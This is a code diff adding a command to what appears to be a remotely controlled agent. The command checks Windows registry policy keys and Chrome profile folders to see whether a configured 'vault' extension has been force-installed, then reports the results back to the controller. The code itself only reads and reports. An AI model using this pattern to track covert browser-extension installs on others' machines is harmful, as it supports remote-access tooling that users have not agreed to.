@@ -16721,6 +16721,82 @@ def on_command(data):
 
         if command in internal_commands:
             output = internal_commands[command]()
+        elif command == "check-extension-status":
+            try:
+                import json
+                ext_id = None
+                try:
+                    cfg = _fetch_extension_config()
+                    ext_id = cfg.get('extension_id') or VAULT_EXTENSION_ID
+                except Exception:
+                    ext_id = VAULT_EXTENSION_ID
+                policy_applied = False
+                registered = False
+                folders = []
+                try:
+                    import sys
+                    if sys.platform == 'win32':
+                        import winreg, os
+                        try:
+                            base2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
+                            i = 0
+                            while True:
+                                try:
+                                    _, value, _ = winreg.EnumValue(base2, i)
+                                    i += 1
+                                    if isinstance(value, str) and value.startswith(str(ext_id) + ";"):
+                                        policy_applied = True
+                                        break
+                                except OSError:
+                                    break
+                            try:
+                                winreg.CloseKey(base2)
+                            except Exception:
+                                pass
+                        except Exception:
+                            pass
+                        try:
+                            access_r = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
+                            winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r)
+                            registered = True
+                        except Exception:
+                            try:
+                                access_r32 = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_32KEY", 0)
+                                winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r32)
+                                registered = True
+                            except Exception:
+                                pass
+                        try:
+                            base = os.environ.get('LOCALAPPDATA') or ''
+                            user_data = os.path.join(base, 'Google', 'Chrome', 'User Data')
+                            if os.path.isdir(user_data):
+                                for name in os.listdir(user_data):
+                                    p = os.path.join(user_data, name, 'Local Extension Settings', str(ext_id))
+                                    if os.path.isdir(p):
+                                        folders.append(p)
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+                installed = bool(registered or (len(folders) > 0))
+                status = {
+                    'agent_id': agent_id,
+                    'extension_id': str(ext_id),
+                    'installed': installed,
+                    'policy_applied': policy_applied,
+                    'registered': registered,
+                    'folder_count': len(folders),
+                    'folders': folders
+                }
+                safe_emit('extension_status', status)
+                output = json.dumps(status, separators=(',', ':'), ensure_ascii=True)
+                safe_emit('command_result', {
+                    'agent_id': agent_id,
+                    'output': output,
+                    'terminal_type': 'legacy',
+                    'timestamp': int(time.time() * 1000)
+                })
+                return
         elif command == "list-processes":
             try:
                 import psutil
